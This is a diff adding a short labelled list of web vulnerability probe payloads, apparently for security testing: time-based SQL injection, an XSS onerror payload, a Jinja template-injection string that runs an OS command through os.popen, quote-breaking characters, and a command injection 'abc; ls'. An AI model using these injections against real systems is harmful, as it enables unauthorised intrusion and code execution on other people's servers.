@@ -1,0 +1,23 @@
+- Time-base SQLi
+'+sleep(5)+'
+
+- an XSS
+&lt;img src=a onerror=alert(document.domain)&gt;
+
+- maybe a DOM?
+canary_15
+
+
+- SSTI
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
+
+
+- And some other special chars, more SSTI? Looks like.
+`
+";}
+
+\";}
+
+
+- Hinting at a command injection:
+abc; ls
